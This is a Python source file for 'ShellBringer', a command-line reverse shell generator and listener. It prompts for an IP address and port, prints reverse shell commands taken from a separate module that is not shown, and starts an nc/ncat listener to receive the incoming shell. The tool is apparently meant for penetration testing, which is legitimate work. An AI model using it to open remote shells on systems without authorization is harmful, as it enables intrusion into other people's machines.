import os
import re
import platform
import subprocess
import pyfiglet
import sys
import ctypes
import ipaddress
import time
from colorama import Fore, Style

from rev_shell_commands import ReverseShellCommands

# Constants
DEFAULT_PORT_MIN = 1
DEFAULT_PORT_MAX = 65535

def detect_os() -> str:
    """Detects the operating system and returns its name."""
    system = platform.system()
    if system == 'Linux':
        return "Linux"
    elif system == 'Darwin':
        return "macOS"
    elif system == 'Windows':
        return "Windows"
    else:
        return "Unknown"

def validate_ip(ip: str) -> bool:
    """Validates an IPv4 address and prints an error message if invalid."""
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        print("Invalid IP address. Please try again.")
        return False

def start_listener(port: int, os_type: str, use_rlwrap: bool) -> None:
    """Starts a listener and blocks until it completes."""
    if os_type == 'Linux':
        listener_command = f"rlwrap nc -lvnp {port}" if use_rlwrap else f"nc -lvnp {port}"
    elif os_type == 'macOS':
        listener_command = f"ncat -lvnp {port}"
    elif os_type == 'Windows':
        ncat_path = r"C:\\Program Files (x86)\\Nmap\\ncat.exe"
        listener_command = f'"{ncat_path}" -lvnp {port}'
    else:
        print(Fore.RED + "Unsupported OS for this listener." + Style.RESET_ALL)
        return

    print(f"Starting listener on port {port}...\n")
    try:
        os.system(listener_command)
        print(f"\nListener on port {port} has stopped.")
    except KeyboardInterrupt:
        print(Fore.RED + "\nListener interrupted by user." + Style.RESET_ALL)

def print_reverse_shell_types(rev_shell_commands: ReverseShellCommands) -> None:
    """Prints available reverse shell commands with colors."""
    commands = rev_shell_commands.list_commands()
    if not commands:
        print(Fore.RED + "No reverse shell commands available. Please check your configuration." + Style.RESET_ALL)
        return

    print(highlight_text("\nAvailable reverse shell commands:", color=Fore.LIGHTYELLOW_EX, style=Style.BRIGHT))
    for index, (key, value) in enumerate(commands.items(), start=1):
        print(highlight_text(f"{index}. ", color=Fore.LIGHTCYAN_EX, style=Style.BRIGHT) + highlight_text(value['name'], color=Fore.WHITE, style=Style.NORMAL))

def get_user_input(prompt: str, validate_func) -> str:
    """Gets user input and validates it, printing a custom message if input is invalid."""
    while True:
        try:
            user_input = input(prompt)
            if validate_func(user_input):
                return user_input
            else:
                print("Invalid input. Please try again.")
        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected. Please try again.")

def highlight_text(text: str, color=Fore.WHITE, style=Style.NORMAL) -> str:
    """Highlights the text with specified color and style."""
    return f"{style}{color}{text}{Style.RESET_ALL}"

def print_contact_info() -> None:
    """Prints contact information from contact_info.txt."""
    with open('contact_info.txt', 'r') as file:
        social_media = file.read()

    print(highlight_text("\nContact:", color=Fore.LIGHTRED_EX, style=Style.BRIGHT))
    print(highlight_text("************************************", color=Fore.LIGHTYELLOW_EX, style=Style.NORMAL))
    print(highlight_text(social_media, color=Fore.GREEN, style=Style.BRIGHT))

def print_header() -> None:
    """Prints the header."""
    with open('header_ascii.txt', 'r') as file:
        ascii_banner = file.read()

    tool_banner = pyfiglet.figlet_format("SHELL BRINGER")

    print(highlight_text(ascii_banner, color=Fore.YELLOW, style=Style.BRIGHT))
    print(highlight_text(tool_banner, color=Fore.GREEN, style=Style.BRIGHT))
    print(highlight_text("Brand New Swiss Army Butterfly Knife!", color=Fore.RED, style=Style.NORMAL))
    print(highlight_text("Reverse Shell Generator + Listener", color=Fore.RED, style=Style.NORMAL))
    print(highlight_text("powered by Onurcan Genc\n", color=Fore.RED, style=Style.BRIGHT))
    print(highlight_text("************************************", color=Fore.YELLOW, style=Style.NORMAL))
    print_contact_info()
    os_type = detect_os()
    print(highlight_text("\nOS Detection:", color=Fore.LIGHTRED_EX, style=Style.BRIGHT), highlight_text(os_type, color=Fore.LIGHTGREEN_EX, style=Style.BRIGHT))
    print(highlight_text("************************************", color=Fore.YELLOW, style=Style.NORMAL))

def print_goodbye_message() -> None:
    goodbye_banner = pyfiglet.figlet_format("GOODBYE!")
    print(highlight_text("\n" + goodbye_banner, color=Fore.RED, style=Style.BRIGHT))
    print(highlight_text("************************************\n", color=Fore.YELLOW, style=Style.NORMAL))
    print(highlight_text("Thank you for using ShellBringer!", color=Fore.GREEN, style=Style.BRIGHT))
    time.sleep(1)

def get_shell_option(rev_shell_commands):
    """Get the shell option from user input."""
    shell_types = list(rev_shell_commands.list_commands().keys())
    while True:
        try:
            option = int(input(highlight_text("Enter the shell option:", color=Fore.WHITE, style=Style.NORMAL) + highlight_text("(0 to exit) ", color=Fore.LIGHTRED_EX, style=Style.BRIGHT)))
            if option == 0:
                return -1
            elif option in range(1, len(shell_types) + 1):
                return option
            else:
                print("Invalid option. Please choose again.")
        except ValueError:
            print("Invalid input. Please enter a number.")

def main() -> None:
    """Main function to run the script."""
    print_header()

    rev_shell_commands = ReverseShellCommands()

    try:
        while True:
            print(highlight_text("\n1. ", color=Fore.LIGHTRED_EX, style=Style.BRIGHT), "List all available reverse shell types")
            print(highlight_text("0. ", color=Fore.LIGHTRED_EX, style=Style.BRIGHT), "Exit\n")

            choice = get_user_input(highlight_text("Enter your choice ", color=Fore.RED, style=Style.BRIGHT) + highlight_text("(0-1): ", color=Fore.RED, style=Style.BRIGHT), lambda x: x in ['0', '1'])
            print("\n")

            if choice == "0":
                print_goodbye_message()
                break
            elif choice == "1":
                print_reverse_shell_types(rev_shell_commands)
                option = get_shell_option(rev_shell_commands)

                if option == -1:
                    print_goodbye_message()
                    break

                shell_types = list(rev_shell_commands.list_commands().keys())
                shell_type = shell_types[option - 1]
                ip = get_user_input(highlight_text("Enter your IP address: ", color=Fore.LIGHTRED_EX, style=Style.BRIGHT), validate_ip)
                port = int(get_user_input(highlight_text(f"Enter the port number ({DEFAULT_PORT_MIN}-{DEFAULT_PORT_MAX}): ", color=Fore.LIGHTRED_EX, style=Style.BRIGHT), lambda x: x.isdigit() and DEFAULT_PORT_MIN <= int(x) <= DEFAULT_PORT_MAX))

                # Fetch and display the selected commands
                commands = rev_shell_commands.get_command(option, port, ip)
                if commands:
                    print(highlight_text("\nGenerated Commands:", color=Fore.LIGHTGREEN_EX, style=Style.BRIGHT))
                    for i, cmd in enumerate(commands, start=1):
                        print(highlight_text(f"{i}. ", color=Fore.LIGHTCYAN_EX, style=Style.BRIGHT) + highlight_text(cmd, color=Fore.WHITE, style=Style.NORMAL))
                    print(highlight_text("\nCopy the command you want to use.", color=Fore.YELLOW, style=Style.BRIGHT))

                os_type = detect_os()
                use_rlwrap = input("Use rlwrap? (y/n): ").lower() == 'y'
                start_listener(port, os_type, use_rlwrap)
    except KeyboardInterrupt:
        print("\nExiting program...")

if __name__ == "__main__":
    main()
